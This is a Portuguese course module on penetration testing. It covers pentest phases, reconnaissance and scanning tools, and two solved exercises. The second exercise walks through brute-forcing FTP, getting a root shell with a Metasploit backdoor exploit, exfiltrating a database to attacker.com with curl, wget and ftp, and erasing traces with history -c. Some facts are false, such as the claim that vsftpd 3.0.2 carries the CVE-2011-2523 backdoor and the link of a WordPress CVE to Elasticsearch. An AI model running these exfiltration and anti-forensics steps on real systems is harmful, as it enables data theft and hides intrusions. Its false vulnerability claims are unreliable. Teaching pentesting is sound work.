# 📖 Módulo 5: Penetration Testing

## 🎯 Objetivos do Módulo

- Entender metodologia de penetration testing
- Aprender fases de um pentest
- Conhecer ferramentas principais
- Realizar pentest prático passo a passo

---

## 5.1 O que é Penetration Testing?

**Definição**: Teste de segurança autorizado onde profissional tenta explorar vulnerabilidades para avaliar a resiliência de um sistema.

```
Diferenças: Pentest vs Vulnerability Scan

Vulnerability Scan:
├─ Automático
├─ Identifica vulnerabilidades conhecidas
├─ Não explora
└─ Rápido (~1 hora)

Penetration Test:
├─ Manual + Automático
├─ Explora vulnerabilidades
├─ Testa impacto real
├─ Lento (dias/semanas)
└─ Mais caro mas mais valioso
```

### Fases de um Pentest (PTES - Penetration Testing Execution Standard)

```
┌────────────────────────────────────────────┐
│ 1. PRE-ENGAGEMENT & SCOPING               │
│    └─ Contrato, autorização, escopo      │
├────────────────────────────────────────────┤
│ 2. RECONNAISSANCE                         │
│    └─ Coleta de informações (passiva)    │
├────────────────────────────────────────────┤
│ 3. SCANNING & ENUMERATION                │
│    └─ Identificar hosts, portas, serviços│
├────────────────────────────────────────────┤
│ 4. VULNERABILITY ASSESSMENT              │
│    └─ Encontrar vulnerabilidades         │
├────────────────────────────────────────────┤
│ 5. EXPLOITATION                          │
│    └─ Explorar vulnerabilidades          │
├────────────────────────────────────────────┤
│ 6. POST-EXPLOITATION                     │
│    └─ Elevar privilégios, persistência   │
├────────────────────────────────────────────┤
│ 7. REPORTING                             │
│    └─ Documentar achados e recomendações│
└────────────────────────────────────────────┘
```

---

## 5.2 Ferramentas de Penetration Testing

### Reconnaissance

```
WHOIS: Informações de domínio
$ whois example.com
Registrar: GoDaddy
Registrant: John Doe
Email: admin@example.com
DNS: ns1.example.com

Google Dorking: Busca avançada
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com "api_key"

Shodan: Search engine para IoT
banner:nginx country:BR port:80
```

### Scanning

```
NMAP: Network mapper (descoberta de hosts)

$ nmap -sV -p- 192.168.1.0/24
Resultado:
Nmap scan report for 192.168.1.10
Host is up (0.23ms latency)
PORT    STATE  SERVICE       VERSION
22/tcp  open   ssh           OpenSSH 7.4
80/tcp  open   http          Apache 2.4.6
443/tcp open   https         nginx 1.14.0
3306/tcp open  mysql         MySQL 5.7.20

Análise:
- SSH (22): Possível brute force
- HTTP/HTTPS (80/443): Web app para testar
- MySQL (3306): Aberto? Deveria estar fechado!
```

### Vulnerability Assessment

```
NESSUS: Scanner de vulnerabilidades
- Identifica CVEs conhecidas
- Testa configurações fracas
- Gera relatório com CVSS

OpenVAS: Alternativa open-source ao Nessus
- Gratuito
- Comunidade ativa
- Menos plugins que Nessus

Burp Suite: Teste de aplicações web
- Intercepta requisições HTTP
- Testa injeção de SQL
- Identifica XSS, CSRF, etc
```

### Exploitation

```
Metasploit Framework: Exploit framework
- Base de dados de exploits
- Gerador de payload
- Automação de ataque

Exemplo:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
exploit

SQLMap: Teste de SQL Injection
$ sqlmap -u "http://site.com/?id=1" -dbs
Resultado:
Database: mysql
[4 tables]
- users
- products
- orders
- logs
```

---

## 5.3 Metodologia Prática

### Fase 1: Reconnaissance

```
Objetivo: Coletar máximo de informações (passivamente)

Informações a Coletar:
1. Domínio da empresa
2. Servidores web associados
3. Funcionários (LinkedIn, GitHub)
4. Tecnologias usadas (stack)
5. Emails corporativos
6. Subdomínios

Ferramentas:
- WHOIS
- Nslookup/Dig
- Google Dorking
- Shodan

Exemplo com Dig (DNS lookup):
$ dig example.com
; <<>> DiG 9.11.3-1ubuntu1.11-Ubuntu <<>> example.com
example.com. 300 IN A 93.184.216.34
example.com. 3600 IN NS ns1.example.com
example.com. 3600 IN NS ns2.example.com

Análise:
- IP: 93.184.216.34 (alvo para próxima fase)
- NS: Hospedagem em DNS externo (sem controle próprio)
```

### Fase 2: Scanning

```
Objetivo: Identificar hosts ativos e portas abertas

Comando NMAP com Opções:
$ nmap -sV -sC -p- -O 93.184.216.34

Flags:
-sV: Detectar versão de serviço
-sC: Executar scripts padrão
-p-: Verificar todas 65535 portas
-O: Detectar SO (OS fingerprinting)

Output Esperado:
Nmap scan report for 93.184.216.34
Host is up (0.100s latency).
PORT    STATE  SERVICE       VERSION
22/tcp  open   ssh           OpenSSH 7.4
80/tcp  open   http          Apache 2.4.6
443/tcp open   https         nginx 1.14
3389/tcp open   ms-wbt-server Windows RDP
Device type: general purpose
OS: Windows Server 2016

Análise de Vulnerabilidades Óbvias:
❌ SSH 7.4: Versão antiga (vulnerável a CVE-2018-15473)
❌ RDP (3389): Aberto para internet (Wannacry alvo)
❌ HTTP (80): Aplicação web para testar
```

### Fase 3: Vulnerability Assessment

```
Objetivo: Encontrar vulnerabilidades específicas

Exemplo com Nessus/OpenVAS:
Scan Results Summary:
- Critical: 5 ⚠️⚠️⚠️
- High: 12
- Medium: 23
- Low: 45

Critical Findings:
1. OpenSSH 7.4 → CVE-2018-15473 (Username enumeration)
2. Apache 2.4.6 → CVE-2017-9788 (Privilege escalation)
3. SQL Injection no /search endpoint
4. Default credentials no MySQL
5. RDP sem NLA (Network Level Authentication)

Score CVSS:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
└─ Score: 9.8 (CRÍTICO)
```

---

## 📝 Exercícios - Módulo 5

### Exercício 5.1: Análise de Resultado NMAP

**Cenário**: Realizado scan NMAP em alvo 192.168.1.50:

```
Nmap scan report for 192.168.1.50
Host is up (0.15ms latency).
PORT     STATE  SERVICE       VERSION
21/tcp   open   ftp           vsftpd 3.0.2
22/tcp   open   ssh           OpenSSH 7.4
80/tcp   open   http          Apache 2.4.6
443/tcp  open   https         nginx 1.14.0
3306/tcp open   mysql         MySQL 5.7.20
3389/tcp open   ms-wbt-server Windows RDP
9200/tcp open   elasticsearch Elasticsearch 5.6
```

**Questão**: Identifique os principais riscos de segurança.

### ✅ Resolução

```
ANÁLISE PORTA POR PORTA:

1. FTP (21) - vsftpd 3.0.2
   ├─ Risco: CRÍTICO
   ├─ Razão: FTP envia credenciais em texto plano
   ├─ Vulnerabilidade: CVE-2011-2523 (backdoor)
   ├─ Impacto: Roubo de credenciais, acesso completo
   └─ Recomendação: Usar SFTP em SSH-22

2. SSH (22) - OpenSSH 7.4
   ├─ Risco: ALTO
   ├─ Vulnerabilidade: CVE-2018-15473 (username enumeration)
   ├─ Versão desatualizada (lançada 2016)
   ├─ Impacto: Descobrir usuários válidos
   └─ Recomendação: Atualizar para 8.x ou 9.x

3. HTTP (80) - Apache 2.4.6
   ├─ Risco: ALTO
   ├─ Versão: 2.4.6 (2013, muito antiga!)
   ├─ Vulnerabilidades: CVE-2017-9788, CVE-2017-7679
   ├─ Impacto: RCE (Remote Code Execution)
   └─ Recomendação: Atualizar para 2.4.48+

4. HTTPS (443) - nginx 1.14.0
   ├─ Risco: MÉDIO
   ├─ Status: Relativamente seguro
   ├─ Recomendação: Usar nginx 1.20+

5. MySQL (3306) - 5.7.20
   ├─ Risco: CRÍTICO ⚠️⚠️⚠️
   ├─ Problema: Aberto para internet
   ├─ Padrão: Deve estar apenas em localhost
   ├─ Impacto: Acesso direto ao banco de dados
   ├─ Cenários de ataque:
   │  a) Conexão sem autenticação
   │  b) Força bruta em senha root
   │  c) Roubo de todos os dados
   └─ Recomendação: Firewall bloqueando 3306 externamente

6. RDP (3389) - Windows RDP
   ├─ Risco: CRÍTICO ⚠️⚠️⚠️
   ├─ Versão: Desconhecida (pode ser legado)
   ├─ Vulnerabilidades: Wannacry, BlueKeep
   ├─ Impacto: Acesso remoto ao desktop
   ├─ Cenários: Brute force de senha RDP
   └─ Recomendação: Bloquecar RDP da internet, usar VPN

7. Elasticsearch (9200)
   ├─ Risco: CRÍTICO ⚠️⚠️⚠️
   ├─ Problema: Aberto e desprotegido
   ├─ Versão 5.6: MUITO desatualizada
   ├─ Vulnerabilidade: CVE-2018-6389 (DoS)
   ├─ Impacto:
   │  - Acesso a TODOS os dados indexados
   │  - Possível RCE
   │  - Usado por ransomware
   └─ Recomendação: Firewall + Autenticação + Atualizar

RESUMO DE RISCO:

CRÍTICO (Exploração Imediata Possível):
✅ FTP aberto
✅ MySQL aberto na internet
✅ RDP aberto na internet
✅ Elasticsearch sem proteção

ALTO (Exploração com mais esforço):
✅ Apache 2.4.6 (CVE conhecidas)
✅ OpenSSH 7.4 (Username enumeration)

IMPACTO POTENCIAL:
- Exfiltração de dados completa (Elasticsearch + MySQL)
- RCE via Apache 2.4.6
- Acesso interativo via RDP
- Roubo de credenciais via FTP
- Sistema totalmente comprometido

PLANO DE AÇÃO PRIORITÁRIO:
1. IMEDIATO: Bloquear portas 3306, 3389, 9200 via firewall
2. HOJE: Atualizar Apache 2.4.6 → 2.4.52+
3. HOJE: Desabilitar FTP (usar SFTP)
4. ESTA SEMANA: Atualizar OpenSSH 7.4 → 8.9+
5. ESTA SEMANA: Atualizar Elasticsearch 5.6 → 8.x
6. CONTÍNUO: Implementar IDS/IPS

ESTIMATIVA DE EXPLORAÇÃO:
- Tempo para comprometer: < 30 minutos
- Habilidade necessária: Iniciante/Intermediário
- Taxa de sucesso: ~95%
```

---

### Exercício 5.2: Planar Ataque em FTP

**Cenário**: FTP descoberto em 192.168.1.50. Planeje exploração.

**Questão**: Liste os passos para acessar FTP e extrair dados.

### ✅ Resolução

```
PLANO DE ATAQUE - FTP vsftpd 3.0.2

PASSO 1: CONECTAR AO FTP
$ ftp 192.168.1.50
Connected to 192.168.1.50.
220 (vsFTPd 3.0.2)
Name (192.168.1.50:user): 

OPÇÕES:

Opção A - Acesso Anônimo (Teste Padrão)
ftp> anonymous
331 Please specify the password.
Password: [qualquer coisa]

SUCESSO? 
├─ Se sim: Acesso anônimo habilitado (CRÍTICO!)
└─ Lista arquivos: ftp> ls -la

Opção B - Força Bruta de Credenciais
Usar ferramenta:
$ hydra -l admin -P wordlist.txt ftp://192.168.1.50
[21][ftp] host: 192.168.1.50  login: admin  password: admin123

PASSO 2: EXPLORAR VULNERABILIDADE CVE-2011-2523

vsftpd 3.0.2 tem backdoor inserido!

Código malicioso:
- Se login com ":)" no final → Shell ativado
- Ex: admin:) → Acessa shell

Exploit Metasploit:
$ msfconsole
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set RHOSTS 192.168.1.50
msf> exploit

[+] 192.168.1.50:21 - Banner: 220 (vsFTPd 3.0.2)
[+] 192.168.1.50:21 - USER: 331 Please specify the password.
[+] Exploit enviado!
[+] Shell reverso obtido!
root@server:/#

PASSO 3: EXTRAIR DADOS

Após obter shell:
root@server:/# ls -la /home
drwxr-xr-x 5 root root 4096 user1
drwxr-xr-x 5 root root 4096 user2

root@server:/# find / -name "*.sql" -o -name "*.xlsx" -o -name "*.pdf"
/var/www/backups/database.sql
/home/user1/documents/confidential.xlsx
/home/admin/financial_2025.pdf

root@server:/# cat /var/www/backups/database.sql > /tmp/db.sql

PASSO 4: TRANSFERIR DADOS PARA ATACANTE

Método 1: Usando FTP
root@server:/# ftp attacker.com
ftp> put /tmp/db.sql
226 Transfer complete.

Método 2: Usando curl
$ curl -X POST -d @/tmp/db.sql http://attacker.com/receive.php

Método 3: Usando wget
$ wget --post-file=/tmp/db.sql http://attacker.com/upload

PASSO 5: COBERTURA DE RASTROS

root@server:/# rm -rf /tmp/db.sql
root@server:/# history -c
root@server:/# last -C  # Ver logins

IMPACTO DO ATAQUE:

❌ Comprometimento Completo:
✅ Acesso shell (root via backdoor)
✅ Exfiltração de database.sql (dados clientes)
✅ Acesso a arquivos confidenciais
✅ Sem deixar rastros

TIMELINE DO ATAQUE:
├─ 00:00: Scan nmap descobre FTP
├─ 00:05: Identifica vsftpd 3.0.2
├─ 00:10: Exploração via Metasploit
├─ 00:12: Shell reverso obtido
├─ 00:15: Dados identificados e exfiltrados
├─ 00:20: Rastros apagados
└─ Tempo total: ~20 MINUTOS

MITIGAÇÃO URGENTE:
1. DESABILITAR FTP IMEDIATAMENTE
2. Atualizar vsftpd ou remover
3. Restaurar backups limpos
4. Investigar logs de FTP (se ainda existirem)
5. Mudar todas as senhas
```

---

## 🎓 Resumo do Módulo 5

✅ Pentest segue PTES (7 fases estruturadas)
✅ NMAP identifica portas e serviços
✅ Serviços antigos = vulnerabilidades conhecidas
✅ Portas de banco de dados abertas = risco crítico
✅ Sempre precisa de autorização por escrito

---

## 📚 Recursos Complementares

- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [HackTheBox - Praticar Penetration Testing](https://www.hackthebox.com/)
- [Metasploit Learning](https://docs.rapid7.com/metasploit/)
- [NMAP Official Guide](https://nmap.org/book/)

